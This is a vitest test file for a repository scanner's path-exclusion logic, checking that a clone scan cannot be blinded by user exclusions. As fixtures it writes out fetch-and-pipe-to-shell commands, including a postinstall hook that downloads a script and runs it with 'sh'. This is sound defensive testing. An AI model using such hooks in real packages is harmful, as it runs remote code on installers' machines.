import { describe, expect, test } from 'vitest';
import { DEFAULT_LIMITS } from '../../src/config/settings';
import { excludesFor, isExcluded, normalizeExclude } from '../../src/scan/exclude';
import { scanJob } from '../../src/scan/scanJob';
import { walk } from '../../src/scan/walker';
import { put, sandbox } from './tree';

const opts = { includeGitConfig: false, nodeModules: 'skip' as const };
const NOTE = 'Some paths are excluded by your stack3.scan.exclude setting';

describe('normalizeExclude', () => {
  test.each([
    ['test/fixtures', 'test/fixtures'],
    ['test/fixtures/', 'test/fixtures'],
    ['test/fixtures/**', 'test/fixtures'],
    ['test/fixtures/*', 'test/fixtures'],
    ['./dist', 'dist'],
    ['  dist  ', 'dist'],
    ['a\\b', 'a/b'],
  ])('%j → %j', (input, out) => expect(normalizeExclude(input)).toBe(out));

  test.each([[''], ['/'], ['**'], ['/etc'], ['../x'], ['a/../b'], ['a/*/b'], ['*.js'], ['a?b'], ['a\u0000b'], ['x'.repeat(201)], [42], [null], [undefined]])(
    '%j is refused',
    (input) => expect(normalizeExclude(input)).toBeUndefined(),
  );
});

describe('isExcluded', () => {
  test('matches the path itself and everything under it, nothing that merely starts with the same letters', () => {
    expect(isExcluded('dist', ['dist'])).toBe(true);
    expect(isExcluded('dist/a/b.js', ['dist'])).toBe(true);
    expect(isExcluded('dist2/a.js', ['dist'])).toBe(false);
    expect(isExcluded('src/dist/a.js', ['dist'])).toBe(false);
    expect(isExcluded('test/fixtures/x/y.json', ['src', 'test/fixtures'])).toBe(true);
    expect(isExcluded('test/other.json', ['test/fixtures'])).toBe(false);
  });
  test('an empty list excludes nothing', () => expect(isExcluded('a', [])).toBe(false));
});

describe('excludesFor', () => {
  test('only the exact folder the user named gets its patterns', () => {
    const map = { '/home/me/proj': ['dist', 'test/fixtures/**'], '/home/me/other': ['src'] };
    expect(excludesFor(map, '/home/me/proj')).toEqual(['dist', 'test/fixtures']);
    expect(excludesFor(map, '/home/me/proj/')).toEqual(['dist', 'test/fixtures']);
    expect(excludesFor(map, '/home/me/proj/sub')).toEqual([]);
    expect(excludesFor(map, '/home/me')).toEqual([]);
    expect(excludesFor(map, '/home/me/proj-evil')).toEqual([]);
    expect(excludesFor({}, '/home/me/proj')).toEqual([]);
  });
});

describe('walk with exclude', () => {
  test('skips excluded files and folders, and says so', async () => {
    const { root } = sandbox();
    put(root, 'src/a.js', 'ok');
    put(root, 'test/fixtures/evil/setup.js', 'curl x | sh');
    put(root, 'test/real.test.js', 'ok');
    put(root, 'dist/bundle.js', 'x');
    const r = await walk(root, DEFAULT_LIMITS, { ...opts, exclude: ['test/fixtures', 'dist'] });
    expect(r.files.map((f) => f.path).sort()).toEqual(['src/a.js', 'test/real.test.js']);
    expect(r.notChecked).toContain(NOTE);
  });
  test('says nothing when nothing matched or no exclusion is set', async () => {
    const { root } = sandbox();
    put(root, 'src/a.js', 'ok');
    expect((await walk(root, DEFAULT_LIMITS, opts)).notChecked).not.toContain(NOTE);
    expect((await walk(root, DEFAULT_LIMITS, { ...opts, exclude: ['nope'] })).notChecked).not.toContain(NOTE);
  });
});

describe('scanJob and exclusions', () => {
  const ctx = (mode: 'clone' | 'workspace' | 'quick') => ({ mode, checkedAt: '2026-10-30T00:00:00Z' });
  function hostile() {
    const { root } = sandbox();
    put(root, 'dist/package.json', JSON.stringify({ name: 'x', version: '1.0.0', scripts: { postinstall: 'curl -s http://127.0.0.1:9/setup.sh | sh' } }));
    put(root, 'package.json', JSON.stringify({ name: 'app', version: '1.0.0' }));
    return root;
  }

  test('a workspace scan honours the exclusion and reports it as not checked, so it is never "clean"', async () => {
    const root = hostile();
    const excluded = await scanJob({ root, ctx: ctx('workspace'), limits: DEFAULT_LIMITS, exclude: ['dist'] });
    expect(excluded.findings.filter((f) => f.severity !== 'caution')).toEqual([]);
    expect(excluded.notChecked).toContain(NOTE);
  });

  test('a clone scan ignores any exclusion: a hostile repo cannot hide behind a user setting', async () => {
    const root = hostile();
    const plain = await scanJob({ root, ctx: ctx('clone'), limits: DEFAULT_LIMITS });
    const withExclude = await scanJob({ root, ctx: ctx('clone'), limits: DEFAULT_LIMITS, exclude: ['dist', 'package.json'] });
    expect(plain.findings.length).toBeGreaterThan(0);
    expect(withExclude.findings).toEqual(plain.findings);
    expect(withExclude.notChecked).not.toContain(NOTE);
  });
});
